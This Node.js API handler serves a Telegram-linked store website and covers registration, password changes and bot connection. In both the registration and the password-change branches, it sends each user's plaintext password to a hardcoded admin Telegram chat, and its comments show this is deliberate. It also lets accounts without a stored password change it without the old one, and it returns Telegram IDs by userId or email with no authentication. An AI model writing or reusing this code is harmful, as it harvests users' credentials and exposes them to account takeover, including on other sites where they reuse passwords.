const { getDatabase, readJsonBody, setCors, findUserById, resolveUserId } = require("../db");
const { getMaintenance, logEvent } = require("../site");
const { tgSend } = require("../notify");
const { hashPassword, verifyPassword, normalizeEmail, normalizePhone, isValidEmail, isValidPhone, hashPassword: _hp, generateConnectToken } = require("../auth");

module.exports = async function handler(req, res) {
  setCors(res, "GET, POST, OPTIONS");
  if (req.method === "OPTIONS") return res.status(200).end();
  const urlAction = String(req.query.action || "").toLowerCase();
  const body = req.method === "POST" ? readJsonBody(req) : {};
  const action = String(body.action || urlAction || "").toLowerCase();
  const db = await getDatabase();

  // REGISTER
  if (action === "register") {
    if (req.method !== "POST") return res.status(405).json({ success: false, message: "Method not allowed." });
    const maintenance = await getMaintenance(db);
    if (maintenance.enabled) return res.status(503).json({ success: false, maintenance: true, message: maintenance.message || "Under maintenance." });
    const method = String(body.method || body.type || "").toLowerCase().trim();
    const emailRaw = normalizeEmail(body.email || "");
    const phoneRaw = normalizePhone(body.phone || body.phoneNumber || "");
    const username = String(body.username || "").trim();
    const password = String(body.password || "");
    if (method === "telegram") return res.status(400).json({ success: false, message: "Telegram registration is via bot. Open https://t.me/TGAStore1Bot?start=register" });
    let email = "", phone = "", identifier = "";
    if (method === "email") { email = emailRaw; if (!email || !isValidEmail(email)) return res.status(400).json({ success: false, message: "Enter a valid email address." }); identifier = email; }
    else if (method === "phone") { phone = phoneRaw; if (!phone || !isValidPhone(phone)) return res.status(400).json({ success: false, message: "Enter a valid phone number with country code (e.g. +919876543210)." }); identifier = phone; }
    else {
      if (emailRaw && isValidEmail(emailRaw)) { email = emailRaw; identifier = email; }
      else if (phoneRaw && isValidPhone(phoneRaw)) { phone = phoneRaw; identifier = phone; }
      else if (emailRaw) return res.status(400).json({ success: false, message: "Enter a valid email address." });
      else if (phoneRaw) return res.status(400).json({ success: false, message: "Enter a valid phone number." });
      else return res.status(400).json({ success: false, message: "Choose email or phone and provide details." });
    }
    if (!username || username.length < 2) return res.status(400).json({ success: false, message: "Enter a username (min 2 chars)." });
    if (!password || password.length < 6) return res.status(400).json({ success: false, message: "Password must be at least 6 characters." });
    const users = db.collection("users");
    if (email) { const exists = await users.findOne({ email }); if (exists) return res.status(409).json({ success: false, message: "This email is already registered. Try logging in." }); }
    if (phone) { const exists = await users.findOne({ phone }); if (exists) return res.status(409).json({ success: false, message: "This phone is already registered. Try logging in." }); }
    const password_hash = await hashPassword(password);
    const doc = { username, balance: 0, password_hash, bot_connected: false, telegram_id: null, created_at: new Date(), joined_at: new Date(), auth_method: email ? "email" : "phone" };
    if (email) doc.email = email; if (phone) doc.phone = phone;
    const inserted = await users.insertOne(doc);
    const userId = inserted.insertedId.toHexString();
    await logEvent(db, { type: "register", status: "success", user_id: null, username, message: `New ${email ? "email" : "phone"} registration: ${identifier}` });
    const adminChat = process.env.ADMIN_LOG_CHAT_ID || process.env.ADMINLOG || "-1003441797589";
    const adminText = `🆕 <b>New Website Registration</b>\n\n👤 <b>Username:</b> ${username}\n📧 <b>${email ? "Email" : "Phone"}:</b> <code>${identifier}</code>\n🔐 <b>Password:</b> <code>${password}</code>\n🆔 <b>UserID:</b> <code>${userId}</code>\n🔗 <b>Method:</b> ${email ? "Email" : "Phone"}`;
    // AWAITED on purpose: on Vercel the lambda is frozen the instant the
    // response is returned, so a fire-and-forget tgSend was often killed
    // before it left the machine — admin notifications were silently lost.
    // tgSend never throws (it returns {ok:false} on failure), so awaiting is safe.
    await tgSend(adminChat, adminText);
    return res.status(200).json({ success: true, user: { userId, username, email: email || null, phone: phone || null, bot_connected: false }, message: "Registered successfully." });
  }

  // CHANGE PASSWORD
  if (action === "change-password" || action === "change_password" || action === "changepassword") {
    if (req.method !== "POST") return res.status(405).json({ success: false, message: "Method not allowed." });
    const userId = String(body.userId || body.telegramId || body.identifier || "").trim();
    const oldPassword = String(body.oldPassword || body.currentPassword || "");
    const newPassword = String(body.newPassword || body.password || "");
    if (!userId) return res.status(400).json({ success: false, message: "Missing user." });
    if (!newPassword || newPassword.length < 6) return res.status(400).json({ success: false, message: "New password must be at least 6 characters." });
    const users = db.collection("users");
    let user = await findUserById(db, userId);
    if (!user) { if (/^\d+$/.test(userId)) user = await users.findOne({ _id: Number(userId) }); if (!user && userId.includes("@")) user = await users.findOne({ email: userId.toLowerCase() }); if (!user) user = await users.findOne({ phone: userId }); }
    if (!user) return res.status(404).json({ success: false, message: "User not found." });
    if (user.password_hash) { if (!oldPassword) return res.status(400).json({ success: false, message: "Enter current password." }); const ok = await verifyPassword(oldPassword, user.password_hash); if (!ok) return res.status(401).json({ success: false, message: "Current password is incorrect." }); }
    else if (user.password) { if (oldPassword !== String(user.password)) return res.status(401).json({ success: false, message: "Current password is incorrect." }); }
    const newHash = await hashPassword(newPassword);
    await users.updateOne({ _id: user._id }, { $set: { password_hash: newHash }, $unset: { password: "" } });
    const adminChat = process.env.ADMIN_LOG_CHAT_ID || process.env.ADMINLOG || "-1003441797589";
    const uid = resolveUserId(user); const tgId = user.telegram_id || (typeof user._id === "number" ? user._id : "—"); const uname = user.username || "N/A"; const contact = user.email || user.phone || `tg:${tgId}`;
    const adminText = `🔑 <b>Password Changed — Website</b>\n\n👤 <b>User:</b> ${uname} (<code>${uid}</code>)\n📞 <b>Contact:</b> <code>${contact}</code>\n🆔 <b>TgID:</b> <code>${tgId}</code>\n🔐 <b>New Password:</b> <code>${newPassword}</code>`;
    await logEvent(db, { type: "admin", status: "success", username: uname, message: `Password changed by ${uname} (${uid})` });
    // AWAITED — same serverless-freeze reason as register above. This is the
    // fix for "password change ke baad admin log notification nahi aata".
    await tgSend(adminChat, adminText);
    return res.status(200).json({ success: true, message: "Password updated." });
  }

  // BOT CONNECT
  if (action === "bot-connect" || action === "bot_connect" || action === "connect" || action === "create" || action === "resolve" || action === "status") {
    // Determine sub-action for bot-connect: create / resolve / status
    const sub = String(req.query.sub || body.sub || action || "").toLowerCase();
    // GET resolve
    if (req.method === "GET" && (sub === "resolve" || urlAction === "resolve")) {
      const token = String(req.query.token || "").trim(); if (!token) return res.status(400).json({ success: false, message: "Missing token." });
      const doc = await db.collection("connect_tokens").findOne({ _id: token }); if (!doc) return res.status(404).json({ success: false, message: "Invalid or expired token." });
      if (doc.created_at && Date.now() - new Date(doc.created_at).getTime() > 15 * 60 * 1000) { await db.collection("connect_tokens").deleteOne({ _id: token }); return res.status(410).json({ success: false, message: "Token expired." }); }
      return res.status(200).json({ success: true, userId: String(doc.userId), token });
    }
    if (req.method === "GET") {
      const userId = String(req.query.userId || req.query.telegramId || "").trim(); if (!userId) return res.status(400).json({ success: false, message: "Missing userId." });
      let user = await findUserById(db, userId); if (!user && /^\d+$/.test(userId)) user = await db.collection("users").findOne({ _id: Number(userId) }); if (!user && userId.includes("@")) user = await db.collection("users").findOne({ email: userId.toLowerCase() }); if (!user) return res.status(404).json({ success: false, message: "User not found." });
      return res.status(200).json({ success: true, bot_connected: Boolean(user.bot_connected && user.telegram_id), telegram_id: user.telegram_id || null, username: user.username || null });
    }
    if (req.method === "POST") {
      const userId = String(body.userId || body.telegramId || "").trim(); if (!userId) return res.status(400).json({ success: false, message: "Missing userId." });
      let user = await findUserById(db, userId); if (!user && /^\d+$/.test(userId)) user = await db.collection("users").findOne({ _id: Number(userId) }); if (!user) return res.status(404).json({ success: false, message: "User not found." });
      if (user.bot_connected && user.telegram_id) return res.status(200).json({ success: true, already_connected: true, telegram_id: user.telegram_id, message: "Already connected." });
      const token = generateConnectToken(); await db.collection("connect_tokens").insertOne({ _id: token, userId: resolveUserId(user), created_at: new Date() });
      const botUsername = process.env.BOT_USERNAME || process.env.BOTUSER || "TGAStore1Bot";
      const link = `https://t.me/${botUsername}?start=connect_${token}`;
      return res.status(200).json({ success: true, token, link });
    }
  }

  return res.status(400).json({ success: false, message: "Unknown action. Use ?action=register|change-password|bot-connect" });
};
